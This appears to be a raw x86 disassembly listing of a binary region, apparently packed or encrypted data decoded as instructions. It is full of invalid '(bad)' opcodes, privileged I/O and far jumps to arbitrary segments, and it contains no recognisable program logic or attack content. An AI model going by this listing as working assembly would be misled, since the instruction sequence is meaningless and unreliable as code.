  410ff5:	int    0xa8
  410ff7:	sub    eax,edx
  410ff9:	rcr    BYTE PTR [edi],0x7a
  410ffc:	jg     0x411079
  410ffe:	cld    
  410fff:	and    bl,ah
  411001:	and    BYTE PTR [ebp+0x3f],bh
  411004:	es jns 0x410fd6
  411007:	call   0xe77f:0xca55b43c
  41100e:	lea    esp,[ecx-0x65b4f580]
  411014:	and    DWORD PTR [edi+0x7a],ebx
  411017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411018:	jno    0x410fb1
  41101a:	rol    DWORD PTR [ecx-0x6739043e],cl
  411020:	jo     0x410fd9
  411022:	mov    ebx,0xb54da2e9
  411027:	or     esp,ebp
  411029:	xchg   edx,eax
  41102a:	mov    esp,0x804a672e
  41102f:	arpl   bp,di
  411031:	adc    edx,esp
  411033:	cli    
  411034:	adc    al,0x68
  411036:	(bad)  
  411037:	mov    ecx,0xee317f5b
  41103c:	call   0x8fd084c0
  411041:	jl     0x411056
  411043:	imul   eax,DWORD PTR [eax],0x6cf61889
  411049:	cs mov eax,eax
  41104c:	adc    ah,BYTE PTR [eax+eax*2]
  41104f:	mov    ds:0x473026db,al
  411054:	or     DWORD PTR [ecx+0x79],eax
  411057:	inc    esi
  411058:	(bad)  
  411059:	repz jb 0x4110b2
  41105c:	jmp    0x4110a3
  41105e:	pop    esi
  41105f:	sbb    ecx,DWORD PTR [ebx]
  411061:	xchg   ebx,eax
  411062:	mov    ebx,DWORD PTR [edx-0xa]
  411065:	(bad)  
  411066:	push   ds
  411067:	daa    
  411068:	push   esi
  411069:	mov    ?,ebx
  41106b:	xchg   esi,eax
  41106c:	sti    
  41106d:	mov    ecx,0xbcd32dce
  411072:	sbb    DWORD PTR [esi],0xe8fa0b93
  411078:	inc    ecx
  411079:	xchg   esp,eax
  41107a:	xor    al,0x0
  41107c:	pushf  
  41107d:	in     al,dx
  41107e:	pop    edx
  41107f:	mov    cl,0x2d
  411081:	cwde   
  411082:	sbb    ah,BYTE PTR [eax]
  411084:	mov    esp,0xfcc0079f
  411089:	fisub  DWORD PTR [eax+0x20]
  41108c:	loopne 0x411035
  41108e:	shl    DWORD PTR [edx],1
  411090:	scas   eax,DWORD PTR es:[edi]
  411091:	sub    eax,DWORD PTR [esi+0x7d2a9268]
  411097:	retf   
  411098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411099:	inc    esp
  41109a:	fistp  WORD PTR [esi-0x1]
  41109d:	cs push ss
  41109f:	xor    ah,BYTE PTR [ebx+0x5ea83ab]
  4110a5:	lar    ebx,WORD PTR [ebx+0x5f]
  4110a9:	pushf  
  4110aa:	xchg   ebx,eax
  4110ab:	leave  
  4110ac:	mov    ecx,0x8414f72a
  4110b1:	call   0x5ba7ff87
  4110b6:	inc    edi
  4110b7:	stc    
  4110b8:	pop    ebp
  4110b9:	inc    eax
  4110ba:	xchg   esp,eax
  4110bb:	les    ebx,FWORD PTR ss:[edx]
  4110be:	inc    ebp
  4110bf:	mov    ebp,0x92da57e2
  4110c4:	jo     0x4110cf
  4110c6:	pop    ebx
  4110c7:	les    ebp,FWORD PTR [ecx+0x244487bd]
  4110cd:	add    dh,ah
  4110cf:	lods   al,BYTE PTR ds:[esi]
  4110d0:	icebp  
  4110d1:	sahf   
  4110d2:	or     eax,0x2143d9fa
  4110d7:	xchg   esi,eax
  4110d8:	mov    es,WORD PTR [eax+0x37]
  4110db:	sahf   
  4110dc:	sahf   
  4110dd:	xor    ecx,DWORD PTR [bp+si+0x3e]
  4110e1:	pop    ss
  4110e2:	xchg   DWORD PTR [esi],ebp
  4110e4:	clc    
  4110e5:	push   eax
  4110e6:	inc    edx
  4110e7:	jge    0x41109b
  4110e9:	sub    eax,0x8163756b
  4110ee:	xchg   ecx,eax
  4110ef:	mov    cl,0xcb
  4110f1:	push   0xeee5fdd2
  4110f6:	and    eax,0xba011e34
  4110fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110fd:	mov    ds:0x97c21e8c,eax
  411102:	out    0x40,eax
  411104:	int3   
  411105:	test   BYTE PTR [eax+0x5a2bd7d3],ch
  41110b:	mov    bh,0x85
  41110d:	ja     0x4110cd
  41110f:	les    esp,FWORD PTR [eax-0x5d]
  411112:	retf   0xd3f0
  411115:	inc    edx
  411116:	add    DWORD PTR [ecx-0x2c],edi
  411119:	mov    eax,ds:0x7bdcb51
  41111e:	pop    ss
  41111f:	call   0x61e1:0xb4552992
  411126:	sub    al,0x60
  411128:	sbb    ch,ch
  41112a:	inc    eax
  41112b:	push   edi
  41112c:	mov    bh,0xca
  41112e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41112f:	mov    cl,0x1f
  411131:	out    0x2a,al
  411133:	or     ebx,DWORD PTR [ebp-0xc113205]
  411139:	les    esi,FWORD PTR [esi]
  41113b:	jge    0x411153
  41113d:	out    0xb1,al
  41113f:	jb     0x411135
  411141:	xchg   esi,eax
  411142:	(bad)
  411145:	push   ebp
  411146:	sub    BYTE PTR [esi+0x50106621],dl
  41114c:	xor    ecx,edx
  41114e:	call   0x1eac:0x9ae301de
  411155:	jne    0x41114d
  411157:	push   edi
  411158:	fsub   DWORD PTR [esi-0x43bf183c]
  41115e:	data16 and bl,ch
  411161:	push   es
  411162:	cwde   
  411163:	jg     0x411160
  411165:	and    ebp,DWORD PTR [edi+0x66]
  411168:	pop    esp
  411169:	lock mov eax,0x52776fd4
  41116f:	sbb    DWORD PTR [eax+0x156f6dd2],ebp
  411175:	lods   eax,DWORD PTR ds:[esi]
  411176:	cmc    
  411177:	les    esp,FWORD PTR [eax]
  411179:	(bad)
  41117d:	xor    ah,bl
  41117f:	pop    ds
  411180:	icebp  
  411181:	ins    DWORD PTR es:[edi],dx
  411182:	pop    ds
  411183:	push   edx
  411184:	ins    DWORD PTR es:[edi],dx
  411185:	ds in  eax,dx
  411187:	mov    WORD PTR [ebp+0x1c],es
  41118a:	push   es
  41118b:	xor    al,0x59
  41118d:	mov    bh,BYTE PTR [edi+eax*2-0x6cd32af2]
  411194:	imul   DWORD PTR [ebx-0x30426178]
  41119a:	clc    
  41119b:	sub    eax,0xed514ecb
  4111a0:	clc    
  4111a1:	in     eax,dx
  4111a2:	imul   ebx,DWORD PTR [esi-0x232caa34],0x13
  4111a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111aa:	inc    ebp
  4111ab:	jg     0x4111ac
  4111ad:	shl    BYTE PTR ds:0x356304f0,0xe9
  4111b4:	dec    esi
  4111b5:	shl    DWORD PTR [bx+si-0x522d],0x8e
  4111bb:	cli    
  4111bc:	push   eax
  4111bd:	or     DWORD PTR [edi],ebx
  4111bf:	jle    0x4111f4
  4111c1:	add    ecx,DWORD PTR [eax-0x21]
  4111c4:	mov    cl,BYTE PTR [esi-0x28b88e2f]
  4111ca:	push   edx
  4111cb:	leave  
  4111cc:	mov    cl,0x81
  4111ce:	stos   BYTE PTR es:[edi],al
  4111cf:	cwde   
  4111d0:	inc    ebx
  4111d1:	aas    
  4111d2:	sbb    al,BYTE PTR [eax-0x6]
  4111d5:	pop    ss
  4111d6:	jns    0x4111a8
  4111d8:	pop    ebx
  4111d9:	cli    
  4111da:	lock fs (bad) 
  4111dd:	ficom  WORD PTR [edi]
  4111df:	dec    ebp
  4111e0:	pop    edx
  4111e1:	xor    BYTE PTR [ebx-0x36],bl
  4111e4:	cwde   
  4111e5:	lds    eax,FWORD PTR [ebx+0x18da9c3f]
  4111eb:	add    al,BYTE PTR [edx]
  4111ed:	sub    eax,0xb6263f07
  4111f2:	push   ebp
  4111f3:	sub    BYTE PTR [esi-0xb],al
  4111f6:	add    dh,BYTE PTR [edx]
  4111f8:	clc    
  4111f9:	fsub   QWORD PTR [esp]
  4111fc:	test   al,0xe8
  4111fe:	fsub   st,st(1)
  411200:	mov    BYTE PTR [ecx+0x1facffda],al
  411206:	or     eax,0xb153a130
  41120b:	scas   al,BYTE PTR es:[edi]
  41120c:	(bad)  
  41120f:	test   al,0x98
  411211:	pop    ds
  411212:	push   edi
  411213:	inc    DWORD PTR [ebp+0x4eb14086]
  411219:	cmp    DWORD PTR ds:0xb3e6b356,ebp
  41121f:	data16 jns 0x41124f
  411222:	cmp    esp,edi
  411224:	push   edx
  411225:	ror    BYTE PTR [eax+0x5c],cl
  411228:	sti    
  411229:	push   esi
  41122a:	cdq    
  41122b:	or     al,0xc6
  41122d:	test   eax,0xee0b1670
  411232:	sbb    BYTE PTR ds:0x461fe43e,cl
  411238:	pand   mm5,QWORD PTR [ebx-0x3842afa8]
  41123f:	jl     0x4112aa
  411241:	or     bh,ch
  411243:	sbb    edx,DWORD PTR [ebx-0x305f9df8]
  411249:	out    0xcd,eax
  41124b:	or     eax,0xaa442841
  411250:	push   ebx
  411251:	add    edi,edx
  411253:	xchg   edx,eax
  411254:	sub    BYTE PTR [edx-0x72],dl
  411257:	jns    0x4111f7
  411259:	into   
  41125a:	loopne 0x4112a0
  41125c:	and    BYTE PTR [ebp+ebx*2-0x746115fa],ah
  411263:	not    ecx
  411265:	fsub   DWORD PTR [edx-0xd]
  411268:	push   cs
  411269:	out    dx,eax
  41126a:	loopne 0x41126a
  41126c:	pop    ds
  41126d:	test   BYTE PTR [eax-0x17],dl
  411270:	dec    esp
  411271:	push   ds
  411272:	xor    al,0x93
  411274:	mov    edi,0xc85acfb
  411279:	adc    ah,BYTE PTR [edx+0x192a9c3]
  41127f:	test   eax,0xfaa74db0
  411284:	aas    
  411285:	bound  ebp,QWORD PTR [ebp-0x3a3ecd7e]
  41128b:	dec    eax
  41128c:	stos   DWORD PTR es:[edi],eax
  41128d:	mov    al,BYTE PTR [ebx]
  41128f:	mov    esi,0x6c6e5e56
  411294:	fstp   DWORD PTR [edx+ecx*8+0x1e]
  411298:	and    al,0xcc
  41129a:	into   
  41129b:	push   ebx
  41129c:	ret    0x2c05
  41129f:	mov    ebp,0xf21ce2c5
  4112a4:	mov    cl,0x13
  4112a6:	jg     0x41129b
  4112a8:	ja     0x4112c6
  4112aa:	shl    BYTE PTR [esi-0x12],0xa7
  4112ae:	je     0x41127e
  4112b0:	(bad)  
  4112b2:	dec    eax
  4112b3:	stos   DWORD PTR es:[edi],eax
  4112b4:	mov    bl,0x87
  4112b6:	mov    ebp,0x540d1c82
  4112bb:	cwde   
  4112bc:	xor    eax,0x31b807c4
  4112c1:	bound  edi,QWORD PTR [ecx+eiz*2-0x66]
  4112c5:	or     al,0xb5
  4112c7:	sub    DWORD PTR [ecx],0xffffff8a
  4112ca:	pushf  
  4112cb:	fild   DWORD PTR [ecx+0x2f]
  4112ce:	push   edi
  4112cf:	loope  0x4112d1
  4112d1:	mov    BYTE PTR ds:0xe7f2b8ac,ch
  4112d7:	push   0x40b22cdc
  4112dc:	test   eax,0x716680fb
  4112e1:	rol    BYTE PTR [edx-0x3f57a83e],0xf9
  4112e8:	dec    esi
  4112e9:	jmp    0xd6b32d8a
  4112ee:	inc    BYTE PTR [edi-0x79]
  4112f1:	jns    0x411290
  4112f3:	jae    0x4112cf
  4112f5:	and    ebp,DWORD PTR [ecx]
  4112f7:	sbb    al,0xf3
  4112f9:	push   eax
  4112fa:	js     0x4112bf
  4112fc:	jmp    0x9126:0x81041e41
  411303:	add    ebx,DWORD PTR [ebx+0x4f7d964c]
  411309:	push   ecx
  41130a:	popa   
  41130b:	lds    edx,FWORD PTR [ecx-0x1d]
  41130e:	jp     0x4112fd
  411310:	jne    0x4112fc
  411312:	xor    al,0x7e
  411314:	mov    ebp,ecx
  411316:	jae    0x411393
  411318:	fdiv   QWORD PTR [esi+0x73]
  41131b:	in     eax,dx
  41131c:	scas   eax,DWORD PTR es:[edi]
  41131d:	(bad)  
  41131e:	jmp    0xa694:0x43e23022
  411325:	retf   
  411326:	popf   
  411327:	push   es
  411328:	scas   eax,DWORD PTR es:[edi]
  411329:	add    ebp,ebx
  41132b:	lahf   
  41132c:	jno    0x4112c8
  41132e:	add    ebx,DWORD PTR [edi-0x30]
  411331:	pusha  
  411332:	jnp    0x4112ef
  411334:	gs jecxz 0x41135a
  411337:	mov    ebp,DWORD PTR [edx-0x7c335bef]
  41133d:	add    al,0x4b
  41133f:	shr    cl,0xd4
  411342:	and    eax,0xe70606b0
  411347:	sbb    al,0xcc
  411349:	jl     0x411314
  41134b:	fdivr  st(7),st
  41134d:	mov    ?,WORD PTR [edx+0x5c]
  411350:	pop    ebp
  411351:	fnstsw WORD PTR [esi+0x69e01e4a]
  411357:	adc    eax,0x57aa4fd8
  41135c:	jmp    0x411397
  41135e:	loopne 0x411387
  411360:	lods   al,BYTE PTR ds:[esi]
  411361:	sbb    eax,0xd093bb74
  411366:	xchg   ebp,eax
  411367:	mov    eax,ebp
  411369:	aaa    
  41136a:	jmp    0x4113e3
  41136c:	mov    bh,0xb2
  41136e:	out    0x8a,al
  411370:	dec    ebx
  411371:	xchg   edx,eax
  411372:	loop   0x41132f
  411374:	(bad)
  411378:	lds    eax,FWORD PTR [ebx+0x684f130a]
  41137e:	sub    al,al
  411380:	and    eax,DWORD PTR [ebp-0x61246e78]
  411386:	retf   0x6081
  411389:	pushf  
  41138a:	push   ss
  41138b:	bound  esi,QWORD PTR [ebx]
  41138d:	call   0x9ee5:0xb61d43ef
  411394:	popa   
  411395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411396:	test   al,0x1c
  411398:	adc    al,ch
  41139a:	push   ebx
  41139b:	xor    DWORD PTR [ebp+0x18],0x4d
  41139f:	pop    eax
  4113a0:	popa   
  4113a1:	adc    DWORD PTR [ebx],edx
  4113a3:	in     al,0xa5
  4113a5:	js     0x411356
  4113a7:	xchg   esi,eax
  4113a8:	jge    0x411355
  4113aa:	mov    edi,0x628800df
  4113af:	arpl   WORD PTR [ebx+0x4b],ax
  4113b2:	fild   WORD PTR [ebx-0x54]
  4113b5:	cli    
  4113b6:	push   eax
  4113b7:	pop    edx
  4113b8:	daa    
  4113b9:	jp     0x4113c6
  4113bb:	cmp    al,0xf3
  4113bd:	push   0xf9707ba2
  4113c2:	sti    
  4113c3:	ret    
  4113c4:	enter  0x30d9,0x5
  4113c8:	inc    edi
  4113c9:	pop    ecx
  4113ca:	and    edi,DWORD PTR [ecx-0x27d94004]
  4113d0:	popa   
  4113d1:	dec    edi
  4113d2:	loope  0x4113b3
  4113d4:	xchg   esi,eax
  4113d5:	dec    ecx
  4113d6:	(bad)  
  4113d8:	xlat   BYTE PTR ds:[ebx]
  4113d9:	mov    bh,0x75
  4113db:	test   DWORD PTR [ebp+0x2be2afd2],esi
  4113e1:	xchg   edx,eax
  4113e2:	cwde   
  4113e3:	in     al,dx
  4113e4:	fwait
  4113e5:	and    eax,0xdf2d8af
  4113ea:	pop    ss
  4113eb:	cmp    eax,eax
  4113ed:	inc    esi
  4113ee:	jo     0x41137f
  4113f0:	add    BYTE PTR [bx+si],cl
  4113f3:	xchg   esi,eax
  4113f4:	dec    esp
  4113f5:	xchg   ebp,eax
  4113f6:	xchg   edi,eax
  4113f7:	mov    ds:0x63fcce69,al
  4113fc:	sbb    al,0xb0
  4113fe:	add    DWORD PTR [ebx],ebp
  411400:	outs   dx,DWORD PTR ds:[esi]
  411401:	dec    edi
  411402:	icebp  
  411403:	ja     0x411444
  411405:	fdivr  QWORD PTR [si]
  411408:	ret    0x790a
  41140b:	push   ecx
  41140c:	stos   BYTE PTR es:[edi],al
  41140d:	lock mov dh,0xb0
  411410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411411:	jbe    0x41140e
  411413:	imul   ebp,DWORD PTR [eax],0x422baa71
  411419:	sub    esp,DWORD PTR [esi+ecx*1-0x703ceb39]
  411420:	ss adc dh,ah
  411423:	cmc    
  411424:	out    dx,eax
  411425:	jp     0x4113b7
  411427:	gs inc eax
  411429:	xor    al,0x47
  41142b:	jne    0x41148e
  41142d:	shl    BYTE PTR [ebx-0x2d],0x10
  411431:	xor    dh,0x5c
  411434:	pop    esi
  411435:	mov    bh,0x88
  411437:	jbe    0x4113e8
  411439:	pop    edi
  41143a:	out    dx,eax
  41143b:	(bad)  
  41143c:	push   0x5a66a14b
  411441:	fild   WORD PTR [edi+esi*1+0x45]
  411445:	and    eax,0x9fe76fa3
  41144a:	daa    
  41144b:	cmp    eax,0xe26cbe5
  411450:	outs   dx,BYTE PTR ds:[esi]
  411451:	or     DWORD PTR [ecx+0x4f],ebx
  411454:	mov    dl,0xb2
  411456:	xchg   ebx,eax
  411457:	scas   al,BYTE PTR es:[edi]
  411458:	jb     0x411455
  41145a:	ins    BYTE PTR es:[edi],dx
  41145b:	mov    ah,0x63
  41145d:	jmp    0x41146e
  41145f:	sub    BYTE PTR [eax],dh
  411461:	adc    ecx,DWORD PTR [edi+0x3a]
  411464:	cmp    DWORD PTR [ebx-0x6c],ebx
  411467:	jmp    0xa59b:0xd870171
  41146e:	cld    
  41146f:	jl     0x41143c
  411471:	aaa    
  411472:	ret    0x874
  411475:	pop    ds
  411476:	stc    
  411477:	dec    ebp
  411478:	pusha  
  411479:	jp     0x4114e5
  41147b:	fnstsw WORD PTR [ecx]
  41147d:	jl     0x4114bb
  41147f:	mov    ch,0x66
  411481:	neg    DWORD PTR [edx-0x538a67aa]
  411487:	inc    eax
  411488:	test   al,0xa3
  41148a:	push   eax
  41148b:	inc    esi
  41148c:	sub    BYTE PTR [eax],dh
  41148e:	pop    ds
  41148f:	pop    esi
  411490:	loope  0x4114fa
  411492:	mov    bh,0xe9
  411494:	adc    bl,ch
  411496:	mov    eax,ds:0x972c58e1
  41149b:	dec    esp
  41149c:	scas   eax,DWORD PTR es:[edi]
  41149d:	cmp    ebx,DWORD PTR [edx]
  41149f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a0:	ss js  0x4114cf
  4114a3:	push   0x8433ee20
  4114a8:	fbld   TBYTE PTR [esi-0xe]
  4114ab:	repz add bl,dl
  4114ae:	mov    bh,0x67
  4114b0:	sub    DWORD PTR [ecx+0x1559f103],esp
  4114b6:	sub    esi,DWORD PTR [esi]
  4114b8:	dec    ebx
  4114b9:	xchg   ebx,eax
  4114ba:	cli    
  4114bb:	and    DWORD PTR [eax+eax*4-0x12a75168],0xbf1dca61
  4114c6:	dec    esi
  4114c7:	add    eax,DWORD PTR [edi+0x32]
  4114ca:	lock cmp BYTE PTR [ebp-0x44781db0],cl
  4114d1:	mov    ds:0x8aba17f3,eax
  4114d7:	cli    
  4114d8:	xchg   ebx,eax
  4114d9:	loopne 0x41150a
  4114db:	cmp    edx,DWORD PTR [edx]
  4114dd:	mov    edi,0x7eef74a9
  4114e2:	add    edx,DWORD PTR [eiz*1+0x5a0485e6]
  4114e9:	xor    DWORD PTR [ecx+ecx*2-0x70a6327e],0x53
  4114f1:	add    DWORD PTR [edi],0x4c
  4114f4:	push   ds
  4114f5:	sbb    eax,0x789d712d
  4114fa:	pop    ds
  4114fb:	or     bh,BYTE PTR [esi+eax*1-0x76]
  4114ff:	push   ss
  411500:	lar    edx,di
  411503:	fwait
  411504:	shl    BYTE PTR [edi+0x36],cl
  411507:	ret    0xf1b4
  41150a:	pop    edi
  41150b:	pop    ebx
  41150c:	add    al,0x2f
  41150e:	jge    0x4114a4
  411510:	push   ds
  411511:	rcl    BYTE PTR [edx-0x5c],0x11
  411515:	test   dh,ah
  411517:	or     eax,0x255b2d32
  41151c:	hlt    
  41151d:	(bad)  
  41151e:	mov    ebp,0x748e30d1
  411523:	ja     0x411549
  411525:	pop    ecx
  411526:	lds    edx,FWORD PTR [esp+ebp*1]
  411529:	aaa    
  41152a:	xor    dh,dl
  41152c:	mov    ah,0x81
  41152e:	and    al,BYTE PTR ds:0xedb443df
  411534:	outs   dx,DWORD PTR ds:[esi]
  411535:	sub    eax,0x869a69e4
  41153a:	fwait
  41153b:	mov    ss,WORD PTR [edi+0x333af6f9]
  411541:	cmp    ebp,ebx
  411543:	push   es
  411544:	add    eax,0x4436d4ad
  411549:	fsubr  QWORD PTR [ecx+0x7e]
  41154c:	mov    ch,0xc7
  41154e:	pusha  
  41154f:	sahf   
  411550:	repnz push cs
  411552:	ins    DWORD PTR es:[edi],dx
  411553:	mov    al,ds:0x69d2468c
  411558:	inc    esi
  411559:	int3   
  41155a:	jns    0x41151a
  41155c:	test   eax,0xdea7151
  411561:	jge    0x411537
  411563:	ret    0xe6dc
  411566:	ja     0x41150f
  411568:	iret   
  411569:	xor    BYTE PTR [ebx],dl
  41156b:	mov    cl,0x67
  41156d:	and    esi,0x52
  411570:	test   eax,0x70a7ea3
  411575:	mov    edx,0xe82c7fcb
  41157a:	iret   
  41157b:	imul   BYTE PTR [edx]
  41157d:	xor    al,0x64
  41157f:	cmp    DWORD PTR [esp+edx*8+0x68a35d31],edx
  411586:	mov    ecx,?
  411588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411589:	adc    ah,bl
  41158b:	iret   
  41158c:	mov    BYTE PTR [eax],al
  41158e:	mov    esp,0xa1bb6bbf
  411593:	push   esi
  411594:	inc    esp
  411595:	fisttp WORD PTR [eax+ebx*4-0x4]
  411599:	push   edi
  41159a:	inc    edi
  41159b:	scas   eax,DWORD PTR es:[edi]
  41159c:	mov    bl,dh
  41159e:	mov    ?,WORD PTR [esi+0x2294f32]
  4115a4:	xchg   DWORD PTR [edi+ebx*4+0x49],edx
  4115a8:	rcl    DWORD PTR [eax-0xe],0x5d
  4115ac:	or     al,0xe6
  4115ae:	xchg   DWORD PTR [esi-0x28a9acb6],edx
  4115b4:	mov    ecx,0x88f60dd
  4115b9:	leave  
  4115ba:	and    BYTE PTR [esp+eiz*8+0x56469aa2],al
  4115c1:	mov    eax,0xf41a7cce
  4115c6:	das    
  4115c7:	sar    DWORD PTR [edx+0x6a],0x30
  4115cb:	sar    BYTE PTR [edx+0x6f],cl
  4115ce:	fild   QWORD PTR [eax]
  4115d0:	sub    DWORD PTR [edx],0x68
  4115d3:	inc    eax
  4115d4:	jecxz  0x411650
  4115d6:	cli    
  4115d7:	je     0x4115d2
  4115d9:	lsl    edi,WORD PTR [eax+0x79]
  4115dd:	xor    BYTE PTR [ebx+0x2ae5dc77],0x8d
  4115e4:	sbb    edi,ecx
  4115e6:	in     eax,dx
  4115e7:	(bad)  
  4115e8:	cmp    bl,cl
  4115ea:	mov    eax,ds:0xda9def1b
  4115ef:	cld    
  4115f0:	aam    0xb7
  4115f2:	sub    DWORD PTR [edi+0x64],esi
  4115f5:	xor    ah,BYTE PTR [edi-0x3a]
  4115f8:	dec    ebx
  4115f9:	inc    edx
  4115fa:	cwde   
  4115fb:	xchg   ecx,eax
  4115fc:	in     al,dx
  4115fd:	xor    ebx,0xffffff94
  411600:	test   al,0x23
  411602:	das    
  411603:	pop    ss
  411604:	push   cs
  411605:	cwde   
  411606:	je     0x411647
  411608:	or     eax,0x14de30f6
  41160d:	loop   0x41161a
  41160f:	call   0xd3ee:0x7b8f0bb0
  411616:	adc    BYTE PTR [eax-0x1dca8df6],0x18
  41161d:	pop    eax
  41161e:	shl    BYTE PTR [ebp+0xa],0x1c
  411622:	dec    ebp
  411623:	dec    esi
  411624:	hlt    
  411625:	(bad)  
  411626:	iret   
  411627:	pop    edi
  411628:	bound  esi,QWORD PTR [edx+0x9]
  41162b:	and    eax,0x72a08146
  411630:	pusha  
  411631:	test   BYTE PTR [ecx],ch
  411633:	xchg   DWORD PTR [edi+0x5772072d],esp
  411639:	neg    BYTE PTR ds:0x4e0c984e
  41163f:	sub    DWORD PTR [edx],0x6fddf2cc
  411645:	shl    DWORD PTR [esi+0x795295be],cl
  41164b:	sbb    edx,DWORD PTR fs:[ebp+0x751c00b6]
  411652:	mov    esi,0x7f8f9a9
  411657:	inc    esi
  411658:	mov    esp,0x7ecd16c1
  41165d:	sbb    eax,0xbc40dad3
  411662:	mov    ch,0xa5
  411664:	xor    DWORD PTR ds:0x1a23f2c0,edx
  41166a:	shl    DWORD PTR [esi-0x7f3165a5],1
  411670:	mov    edx,0x1934833e
  411675:	cli    
  411676:	sbb    DWORD PTR [ecx+0x7c74343],eax
  41167c:	out    0x6a,eax
  41167e:	loop   0x41164f
  411680:	jnp    0x411626
  411682:	in     al,0xcc
  411684:	iret   
  411685:	rcr    BYTE PTR [edx],0xbf
  411688:	or     eax,0xd3ac8838
  41168d:	pusha  
  41168e:	adc    dh,dl
  411690:	fwait
  411691:	das    
  411692:	pop    eax
  411693:	mov    esp,edx
  411695:	aaa    
  411696:	or     edx,ebp
  411698:	sbb    BYTE PTR [ebx+eiz*2-0x3f],ch
  41169c:	and    DWORD PTR [esi+ebp*4+0x6365a106],ebx
  4116a3:	xchg   edx,eax
  4116a4:	jbe    0x41170a
  4116a6:	pop    ecx
  4116a7:	inc    edi
  4116a8:	js     0x4116c1
  4116aa:	mov    cs,WORD PTR [edx+0x2e766227]
  4116b0:	or     al,0xe4
  4116b2:	adc    BYTE PTR [edx+edi*1+0xe7128e7],dh
  4116b9:	addr16 inc edi
  4116bb:	sbb    BYTE PTR [eax-0x8],0x3d
  4116bf:	xor    eax,DWORD PTR [esi+0x5abf3fe4]
  4116c5:	xchg   BYTE PTR [edi+0x667ebd9b],cl
  4116cb:	ffree  st(2)
  4116cd:	loop   0x411700
  4116cf:	in     al,dx
  4116d0:	arpl   WORD PTR [ebx+ebp*2+0x7b],bx
  4116d4:	iret   
  4116d5:	adc    BYTE PTR [ebx-0x58],dl
  4116d8:	stos   BYTE PTR es:[edi],al
  4116d9:	test   BYTE PTR [esi+edx*1+0x3e],0x5c
  4116de:	test   cl,bh
  4116e0:	sbb    DWORD PTR [eax],edx
  4116e2:	bound  ebp,QWORD PTR [ecx]
  4116e4:	sar    BYTE PTR [esi+edi*2+0x380da0fd],cl
  4116eb:	and    esi,eax
  4116ed:	or     al,0x3a
  4116ef:	mov    esp,0xa62b8544
  4116f4:	test   al,0x20
  4116f6:	pop    es
  4116f7:	ret    
  4116f8:	xlat   BYTE PTR ds:[ebx]
  4116f9:	cmc    
  4116fa:	mov    esi,0x3361d1bf
  4116ff:	xchg   ch,ah
  411701:	sbb    esp,ecx
  411703:	and    dh,BYTE PTR [eax]
  411705:	push   cs
  411706:	(bad)  
  411708:	sub    ebp,edi
  41170a:	fcmovnbe st,st(1)
  41170c:	cmp    DWORD PTR [bp+si-0x7],edi
  411710:	mov    bh,0x9e
  411712:	xchg   edi,eax
  411713:	ss xor ch,dl
  411716:	stos   BYTE PTR es:[edi],al
  411717:	cdq    
  411718:	bound  esp,QWORD PTR [esi+0x1c]
  41171b:	test   DWORD PTR [ebx+0x33],esi
  41171e:	mov    esi,edx
  411720:	dec    DWORD PTR [eax]
  411722:	mov    eax,0xfd6118ac
  411727:	xchg   ebx,eax
  411728:	sahf   
  411729:	xchg   ecx,eax
  41172a:	jae    0x41178c
  41172c:	adc    esi,edx
  41172e:	add    DWORD PTR [edi],0x1d
  411731:	push   0x14
  411733:	and    esi,esp
  411735:	sub    eax,0xf764889c
  41173a:	(bad)  
  41173b:	push   edi
  41173c:	sub    edi,ebx
  41173e:	add    ebx,eax
  411740:	fisttp WORD PTR [edx+eiz*4+0x19]
  411744:	adc    DWORD PTR [ecx+0x7ac5541b],0x6d
  41174b:	popf   
  41174c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41174d:	loope  0x4117bd
  41174f:	int3   
  411750:	inc    esp
  411751:	xchg   esi,eax
  411752:	pop    edx
  411753:	mov    al,0x61
  411755:	mov    dh,0xd8
  411757:	clc    
  411758:	sub    al,0xb7
  41175a:	imul   ebp,DWORD PTR [ecx],0x2b
  41175d:	jns    0x411781
  41175f:	xchg   ebx,eax
  411760:	adc    ecx,eax
  411762:	fisttp QWORD PTR [esp+eax*4+0x29f23118]
  411769:	xchg   edi,eax
  41176a:	leave  
  41176b:	mov    DWORD PTR [ecx],ebx
  41176d:	arpl   bp,cx
  41176f:	in     eax,0x85
  411771:	adc    bh,BYTE PTR ds:[ebx-0x603dbd9e]
  411778:	xor    eax,0xd715b001
  41177d:	mov    bh,0x42
  41177f:	cmp    DWORD PTR [ebp-0x653a706d],eax
  411785:	mov    esi,0x6863e768
  41178a:	les    edx,FWORD PTR ds:0xbc0af073
  411790:	sub    eax,0x87c35c1f
  411795:	mov    al,0x42
  411797:	sahf   
  411798:	pop    eax
  411799:	pop    ebp
  41179a:	pop    ds
  41179b:	pop    ebp
  41179c:	int3   
  41179d:	jge    0x4117cf
  41179f:	test   DWORD PTR [esi],ecx
  4117a1:	daa    
  4117a2:	push   edx
  4117a3:	ja     0x411753
  4117a5:	push   es
  4117a6:	sub    BYTE PTR fs:[edx+0x4c],bh
  4117aa:	add    DWORD PTR [ebx-0xe0c53de],edx
  4117b0:	sub    DWORD PTR [ecx-0x9d17186],esp
  4117b6:	out    dx,al
  4117b7:	lods   al,BYTE PTR ds:[esi]
  4117b8:	mov    ?,WORD PTR [edx-0x575b9c9a]
  4117be:	int3   
  4117bf:	imul   ecx,DWORD PTR [edx-0x737c66ef],0x542d7a91
  4117c9:	cli    
  4117ca:	mov    cl,0x9
  4117cc:	int3   
  4117cd:	jns    0x4117c4
  4117cf:	push   cs
  4117d0:	dec    esi
  4117d1:	pushf  
  4117d2:	cmp    al,0xa4
  4117d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d5:	add    esp,edx
  4117d7:	mov    dl,0x6e
  4117d9:	ins    DWORD PTR es:[edi],dx
  4117da:	sbb    edx,DWORD PTR [ebx-0x1e7822cf]
  4117e0:	scas   eax,DWORD PTR es:[edi]
  4117e1:	push   ds
  4117e2:	cs stos BYTE PTR es:[edi],al
  4117e4:	shl    BYTE PTR ds:0x6ae840e7,1
  4117ea:	leave  
  4117eb:	retf   
